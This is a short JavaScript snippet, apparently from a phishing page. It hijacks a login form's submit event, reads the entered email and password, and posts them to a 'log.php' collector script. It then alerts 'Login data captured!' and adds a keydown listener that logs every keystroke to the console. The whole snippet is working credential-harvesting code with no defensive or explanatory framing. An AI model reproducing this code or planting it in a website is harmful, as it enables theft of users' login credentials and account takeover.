document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.getElementsByName('email')[0].value;
    const password = document.getElementsByName('password')[0].value;
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'log.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if (this.status >= 200 && this.status < 400) {
            console.log('Data sent successfully!');
            alert("Login data captured!");
        } else {
            console.error('Error sending data.');
        }
    };
    xhr.onerror = function() {
        console.error('Network error.');
    };
    xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
});

document.addEventListener('keydown', function(e) {
    console.log('Key pressed: ' + e.key);
});
